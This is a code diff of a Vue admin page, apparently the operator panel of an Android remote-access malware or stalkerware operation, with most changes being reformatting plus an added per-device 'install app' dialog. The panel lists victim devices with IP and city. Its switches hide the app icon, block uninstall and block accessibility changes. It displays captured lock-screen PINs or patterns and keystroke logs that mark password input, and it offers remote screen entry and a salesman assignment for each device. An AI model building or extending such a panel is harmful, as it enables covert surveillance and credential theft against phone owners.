@@ -23,8 +23,7 @@
 
       <el-form-item>
         <el-select filterable v-model="dataForm.installApp" placeholder="已安装APP" clearable>
-          <el-option v-for="app in installAppFilter" :key="app.packageName"
-            :label="`${app.appName}(${app.packageName})`" :value="app.packageName"></el-option>
+          <el-option v-for="app in installAppFilter" :key="app.packageName" :label="`${app.appName}(${app.packageName})`" :value="app.packageName"></el-option>
         </el-select>
       </el-form-item>
 
@@ -39,73 +38,46 @@
         <el-button @click="getDataList()">{{ $t("query") }}</el-button>
       </el-form-item>
     </el-form>
-    <el-table v-loading="dataListLoading" :data="dataList" border @sort-change="dataListSortChangeHandle"
-      table-layout="auto" style="width: 100%">
-      <el-table-column prop="deviceId" label="设备ID" header-align="center" align="center"
-      width="150px"
-        show-overflow-tooltip></el-table-column>
-      <el-table-column prop="pkg" label="所属包" header-align="center" align="center"
-            width="150px"
-        show-overflow-tooltip></el-table-column>
-      <el-table-column prop="brand" label="品牌" header-align="center" align="center" width="80px"
-        :show-overflow-tooltip="true"></el-table-column>
-      <el-table-column prop="model" label="手机型号" header-align="center" align="center" width="80px"
-        show-overflow-tooltip></el-table-column>
-      <el-table-column prop="language" label="语言" header-align="center" align="center" width="60px"
-        show-overflow-tooltip></el-table-column>
-      <el-table-column prop="systemVersion" label="系统版本" header-align="center" align="center" width="80px"
-        show-overflow-tooltip></el-table-column>
-      <el-table-column prop="sdkVersion" label="sdk版本" header-align="center" align="center" width="80px"
-        :show-overflow-tooltip="true"></el-table-column>
+    <el-table v-loading="dataListLoading" :data="dataList" border @sort-change="dataListSortChangeHandle" table-layout="auto" style="width: 100%">
+      <el-table-column prop="deviceId" label="设备ID" header-align="center" align="center" width="150px" show-overflow-tooltip></el-table-column>
+      <el-table-column prop="pkg" label="所属包" header-align="center" align="center" width="150px" show-overflow-tooltip></el-table-column>
+      <el-table-column prop="brand" label="品牌" header-align="center" align="center" width="80px" :show-overflow-tooltip="true"></el-table-column>
+      <el-table-column prop="model" label="手机型号" header-align="center" align="center" width="80px" show-overflow-tooltip></el-table-column>
+      <el-table-column prop="language" label="语言" header-align="center" align="center" width="60px" show-overflow-tooltip></el-table-column>
+      <el-table-column prop="systemVersion" label="系统版本" header-align="center" align="center" width="80px" show-overflow-tooltip></el-table-column>
+      <el-table-column prop="sdkVersion" label="sdk版本" header-align="center" align="center" width="80px" :show-overflow-tooltip="true"></el-table-column>
 
       <el-table-column label="屏幕分辨率" header-align="center" align="center" width="80px" :show-overflow-tooltip="true">
         <template v-slot="scope">
           {{ `${scope.row.screenWidth}×${scope.row.screenHeight}` }}
         </template>
       </el-table-column>
-      <el-table-column prop="ip" label="IP/城市" header-align="center" align="center" width="150px"
-        :show-overflow-tooltip="true">
-
+      <el-table-column prop="ip" label="IP/城市" header-align="center" align="center" width="150px" :show-overflow-tooltip="true">
         <template v-slot="scope">{{ scope.row.ip }} / {{ scope.row.addr }}</template>
       </el-table-column>
 
       <el-table-column label="开关" header-align="center" align="right" width="130px">
         <template v-slot="scope">
-
-          <el-switch inactive-text="隐藏图标" :model-value="!!scope.row.hideIcon"
-            @update:model-value="updateDeviceSwitch(scope.row, 'hideIcon', $event)" />
-          <el-switch inactive-text="阻止卸载" :model-value="!!scope.row.uninstallGuard"
-            @update:model-value="updateDeviceSwitch(scope.row, 'uninstallGuard', $event)" />
-          <el-switch inactive-text="阻止无障碍" :model-value="!!scope.row.accessibilityGuard"
-            @update:model-value="updateDeviceSwitch(scope.row, 'accessibilityGuard', $event)" />
-
-          <el-switch inactive-text="固定锁屏" :model-value="!!scope.row.fixLockScreen"
-            @update:model-value="updateDeviceSwitch(scope.row, 'fixLockScreen', $event)" />
-
+          <el-switch inactive-text="隐藏图标" :model-value="!!scope.row.hideIcon" @update:model-value="updateDeviceSwitch(scope.row, 'hideIcon', $event)" />
+          <el-switch inactive-text="阻止卸载" :model-value="!!scope.row.uninstallGuard" @update:model-value="updateDeviceSwitch(scope.row, 'uninstallGuard', $event)" />
+          <el-switch inactive-text="阻止无障碍" :model-value="!!scope.row.accessibilityGuard" @update:model-value="updateDeviceSwitch(scope.row, 'accessibilityGuard', $event)" />
+          <el-switch inactive-text="固定锁屏" :model-value="!!scope.row.fixLockScreen" @update:model-value="updateDeviceSwitch(scope.row, 'fixLockScreen', $event)" />
         </template>
       </el-table-column>
-
-
-
       <el-table-column label="设备状态" header-align="center" align="right" width="150px">
         <template v-slot="scope">
           <div>
             可解锁
-            <el-tooltip v-if="scope.row.lockScreen" class="box-item" effect="dark"
-              :content="formatUnlockTips(scope.row)" placement="top">
+            <el-tooltip v-if="scope.row.lockScreen" class="box-item" effect="dark" :content="formatUnlockTips(scope.row)" placement="top">
               <el-tag type="success">YES</el-tag>
             </el-tooltip>
             <el-tag type="danger" v-else>NO</el-tag>
           </div>
-
-
           <div>
             无障碍权限
             <el-tag type="success" v-if="scope.row.accessibilityServiceEnabled == 1">已授权</el-tag>
             <el-tag type="danger" v-else>未授权</el-tag>
           </div>
-
-
           <div>
             状态
             <el-tag type="danger" v-show="scope.row.status == 0">熄屏</el-tag>
@@ -116,34 +88,40 @@
         </template>
       </el-table-column>
 
-      <el-table-column prop="lastHeart" label="最后活动时间" header-align="center" align="center" width="150px"
-        :show-overflow-tooltip="true"></el-table-column>、
-      <el-table-column prop="user" label="业务员" show-overflow-tooltip header-align="center" width="80px"
-        align="center"></el-table-column>
-      <el-table-column prop="remark" label="备注" show-overflow-tooltip header-align="center"
-        align="center"></el-table-column>
+      <el-table-column prop="lastHeart" label="最后活动时间" header-align="center" align="center" width="150px" :show-overflow-tooltip="true"></el-table-column>、
+      <el-table-column prop="user" label="业务员" show-overflow-tooltip header-align="center" width="80px" align="center"></el-table-column>
+      <el-table-column prop="remark" label="备注" show-overflow-tooltip header-align="center" align="center"></el-table-column>
       <el-table-column :label="$t('handle')" header-align="center" align="center" width="90px" fixed="right">
         <template v-slot="scope">
-              <!-- <el-button-group > -->
-                <div>
-                  <el-button  link type="primary"  @click="enterScreen(scope.row)">进入</el-button>
-                </div>
-                <div>
-                  <el-button  link type="primary"  @click="showInputLog(scope.row)">输入记录</el-button>
-                </div>
-                <div>
-                  <el-button link type="primary" v-if="!scope.row.user" @click="openAddSalesman(scope.row)">添加业务员</el-button>
-                </div>
-                <div>
-                  <el-button  link type="primary">备注</el-button>
-                </div>
-              <!-- </el-button-group> -->
+          <!-- <el-button-group > -->
+          <div>
+            <el-button link type="primary" @click="enterScreen(scope.row)">进入</el-button>
+          </div>
+          <div>
+            <el-button link type="primary" @click="showInputLog(scope.row)">输入记录</el-button>
+          </div>
+          <div>
+            <el-button link type="primary" v-if="!scope.row.user" @click="openAddSalesman(scope.row)">添加业务员</el-button>
+          </div>
+          <div>
+            <el-button link type="primary" @click="showAppList(scope.row)">安装应用</el-button>
+          </div>
+          <div>
+            <el-button link type="primary">备注</el-button>
+          </div>
+          <!-- </el-button-group> -->
         </template>
       </el-table-column>
     </el-table>
-    <el-pagination :current-page="page" :page-sizes="[10, 20, 50, 100]" :page-size="limit" :total="total"
-      layout="total, sizes, prev, pager, next, jumper" @size-change="pageSizeChangeHandle"
-      @current-change="pageCurrentChangeHandle">
+    <el-pagination
+      :current-page="page"
+      :page-sizes="[10, 20, 50, 100]"
+      :page-size="limit"
+      :total="total"
+      layout="total, sizes, prev, pager, next, jumper"
+      @size-change="pageSizeChangeHandle"
+      @current-change="pageCurrentChangeHandle"
+    >
     </el-pagination>
 
     <DeviceDetail ref="deviceDetail" @wakeup="wakeup"></DeviceDetail>
@@ -158,7 +136,7 @@
           <el-descriptions-item label="所属包">{{ salesmanRow?.pkg }}</el-descriptions-item>
         </el-descriptions>
       </div>
-      <div style="margin-top: 16px;">
+      <div style="margin-top: 16px">
         <el-form label-width="90px">
           <el-form-item label="业务员">
             <el-input v-model="salesmanName" placeholder="请输入业务员账号" clearable></el-input>
@@ -172,50 +150,57 @@
     </el-dialog>
 
     <!-- 输入日志弹窗 -->
-    <el-dialog v-model="inputLogVisible" :title="`输入日志 - 设备ID: ${currentDevice.deviceId} 包名: ${currentDevice.pkg}`"
-      width="970px" :close-on-click-modal="false" class="input-log-dialog">
+    <el-dialog v-model="inputLogVisible" :title="`输入日志 - 设备ID: ${currentDevice.deviceId} 包名: ${currentDevice.pkg}`" width="970px" :close-on-click-modal="false" class="input-log-dialog">
       <div class="log-header">
         <div class="header-row">
           <div class="query-controls">
             <span class="query-label">来源:</span>
-            <el-select v-model="querySource" placeholder="选择来源" clearable style="width: 120px;">
+            <el-select v-model="querySource" placeholder="选择来源" clearable style="width: 120px">
               <el-option label="管理端" :value="1" />
               <el-option label="App端" :value="0" />
             </el-select>
             <span class="query-label">APP包名:</span>
-            <el-input v-model="queryAppPkg" placeholder="输入APP包名" clearable style="width: 200px;" />
+            <el-input v-model="queryAppPkg" placeholder="输入APP包名" clearable style="width: 200px" />
             <span class="query-label">查询日期:</span>
-            <el-date-picker v-model="queryDate" type="daterange" range-separator="至" start-placeholder="开始日期"
-              end-placeholder="结束日期" format="YYYY-MM-DD" value-format="YYYY-MM-DD" @change="onDateChange"
-              style="width: 280px;" />
-            <el-button type="primary" @click="refreshLog" :loading="logLoading" size="small">
-              重新查询
-            </el-button>
+            <el-date-picker
+              v-model="queryDate"
+              type="daterange"
+              range-separator="至"
+              start-placeholder="开始日期"
+              end-placeholder="结束日期"
+              format="YYYY-MM-DD"
+              value-format="YYYY-MM-DD"
+              @change="onDateChange"
+              style="width: 280px"
+            />
+            <el-button type="primary" @click="refreshLog" :loading="logLoading" size="small">重新查询</el-button>
           </div>
         </div>
       </div>
 
       <div class="log-content" v-loading="logLoading">
-        <div class="log-item" v-for="(item, index) in inputLogList" :key="index"
-          :class="{ 'password-item': item.password == 1 }">
+        <div class="log-item" v-for="(item, index) in inputLogList" :key="index" :class="{ 'password-item': item.password == 1 }">
           <div class="log-content-row">
             <span class="log-time">{{ item.date || formatTime(item.time) }}</span>
             <span class="log-source" :class="{ 'source-admin': item.source == 1, 'source-app': item.source == 0 }">
-              {{ item.source == 1 ? '管理端' : 'App端' }}
+              {{ item.source == 1 ? "管理端" : "App端" }}
             </span>
             <span class="log-app">{{ item.app }}</span>
             <span class="log-resource" v-if="item.resourceId">{{ item.resourceId }}</span>
-            <span class="log-text">{{ item.text || (item.password == 1 ? '[密码输入]' : '无内容') }}</span>
+            <span class="log-text">{{ item.text || (item.password == 1 ? "[密码输入]" : "无内容") }}</span>
           </div>
         </div>
-        <div v-if="inputLogList.length === 0 && !logLoading" class="no-data">
-          暂无输入日志数据
-        </div>
+        <div v-if="inputLogList.length === 0 && !logLoading" class="no-data">暂无输入日志数据</div>
       </div>
 
       <template #footer>
         <el-button @click="inputLogVisible = false">关闭</el-button>
       </template>
+    </el-dialog>
+
+    <!-- 安装应用弹窗 -->
+    <el-dialog v-model="appListVisible" :title="`安装应用列表 - 设备ID: ${currentAppDevice.deviceId}`" width="1200px" :close-on-click-modal="false">
+      <AppList :device-id="currentAppDevice.deviceId" />
     </el-dialog>
   </div>
 </template>
@@ -224,11 +209,13 @@
 import useView from "@/hooks/useView";
 import baseService from "@/service/baseService";
 import DeviceDetail from "@/views/device/detail.vue";
+import AppList from "@/views/apps/list.vue";
 import { defineComponent, reactive, toRefs, ref } from "vue";
 import { ElMessageBox, ElMessage } from "element-plus";
 export default defineComponent({
   components: {
-    DeviceDetail
+    DeviceDetail,
+    AppList
   },
   setup() {
     const state = reactive({
@@ -244,7 +231,7 @@ export default defineComponent({
         language: "",
         brand: "",
         installApp: "",
-        status: ''
+        status: ""
       }
     });
     const deviceId = ref("");
@@ -256,14 +243,35 @@ export default defineComponent({
     const logLoading = ref(false);
     const inputLogList = ref([]);
     const queryDate = ref<any>([]);
-    const queryAppPkg = ref('');
+    const queryAppPkg = ref("");
     const querySource = ref(null);
     const currentDevice = ref({
-      deviceId: '',
-      pkg: ''
+      deviceId: "",
+      pkg: ""
+    });
+    const appListVisible = ref(false);
+    const currentAppDevice = ref({
+      deviceId: ""
     });
 
-    return { ...useView(state), ...toRefs(state), deviceId, inputLogVisible, logLoading, inputLogList, queryDate, queryAppPkg, querySource, currentDevice, salesmanDialogVisible, salesmanName, salesmanSubmitting, salesmanRow };
+    return {
+      ...useView(state),
+      ...toRefs(state),
+      deviceId,
+      inputLogVisible,
+      logLoading,
+      inputLogList,
+      queryDate,
+      queryAppPkg,
+      querySource,
+      currentDevice,
+      salesmanDialogVisible,
+      salesmanName,
+      salesmanSubmitting,
+      salesmanRow,
+      appListVisible,
+      currentAppDevice
+    };
   },
   async mounted() {
     await this.fetchInstallAppFilterList();
@@ -285,7 +293,7 @@ export default defineComponent({
       }
     },
     async wakeup(row: any) {
-      let { code, data, msg } = await baseService.post("/device/wakeup", {
+      let { code, msg } = await baseService.post("/device/wakeup", {
         id: row.id
       });
 
@@ -334,14 +342,12 @@ export default defineComponent({
     async showInputLog(row: any) {
       this.currentDevice.deviceId = row.deviceId;
       this.currentDevice.pkg = row.pkg; // 包名
-      this.queryAppPkg = ''; // 清空APP包名输入框
+      this.queryAppPkg = ""; // 清空APP包名输入框
       this.querySource = null; // 清空来源选择
 
       // 设置默认查询日期为今天（范围）
       const today = new Date();
-      const todayStr = today.getFullYear() + '-' +
-        String(today.getMonth() + 1).padStart(2, '0') + '-' +
-        String(today.getDate()).padStart(2, '0');
+      const todayStr = today.getFullYear() + "-" + String(today.getMonth() + 1).padStart(2, "0") + "-" + String(today.getDate()).padStart(2, "0");
       this.queryDate = [todayStr, todayStr];
 
       this.inputLogVisible = true;
@@ -406,20 +412,20 @@ export default defineComponent({
       // this.refreshLog();
     },
     formatTime(timestamp: any) {
-      if (!timestamp) return '';
+      if (!timestamp) return "";
 
       const timeNum = Number(timestamp);
-      if (isNaN(timeNum)) return '';
+      if (isNaN(timeNum)) return "";
 
       const date = new Date(timeNum);
-      if (isNaN(date.getTime())) return '';
+      if (isNaN(date.getTime())) return "";
 
       const year = date.getFullYear();
-      const month = String(date.getMonth() + 1).padStart(2, '0');
-      const day = String(date.getDate()).padStart(2, '0');
-      const hours = String(date.getHours()).padStart(2, '0');
-      const minutes = String(date.getMinutes()).padStart(2, '0');
-      const seconds = String(date.getSeconds()).padStart(2, '0');
+      const month = String(date.getMonth() + 1).padStart(2, "0");
+      const day = String(date.getDate()).padStart(2, "0");
+      const hours = String(date.getHours()).padStart(2, "0");
+      const minutes = String(date.getMinutes()).padStart(2, "0");
+      const seconds = String(date.getSeconds()).padStart(2, "0");
 
       return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
     },
@@ -433,10 +439,15 @@ export default defineComponent({
       // 这里可以添加 API 调用来同步到后端
       // 例如:
       try {
-        const { success, msg } = await baseService.post("/device/updateSwitch", {
-          id: row.id,
-          [field]: intValue
-        }, undefined, true);
+        const { success, msg } = await baseService.post(
+          "/device/updateSwitch",
+          {
+            id: row.id,
+            [field]: intValue
+          },
+          undefined,
+          true
+        );
         if (success) {
           ElMessage.success("更新成功");
         } else {
@@ -451,23 +462,27 @@ export default defineComponent({
       }
     },
     formatUnlockTips(row: any) {
-      let type = '';
+      let type = "";
       switch (row.lockScreen.type) {
         case 0:
-          return "无锁"
+          return "无锁";
         case 1:
-          type = 'PIN码';
+          type = "PIN码";
           break;
         case 2:
-          type = '手势';
+          type = "手势";
           break;
         case 3:
-          type = '混合密码';
+          type = "混合密码";
           break;
         default:
           return "未知";
       }
       return `${type}:${row.lockScreen.tips}`;
+    },
+    showAppList(row: any) {
+      this.currentAppDevice.deviceId = row.deviceId;
+      this.appListVisible = true;
     }
   }
 });
@@ -498,7 +513,7 @@ export default defineComponent({
   flex-wrap: nowrap;
 }
 
-.action-buttons.compact .el-button+.el-button {
+.action-buttons.compact .el-button + .el-button {
   margin-left: 4px;
 }
 
@@ -612,7 +627,7 @@ export default defineComponent({
 }
 
 .log-text {
-  font-family: 'Courier New', monospace;
+  font-family: "Courier New", monospace;
   font-size: 13px;
   color: #303133;
   background: #f8f9fa;
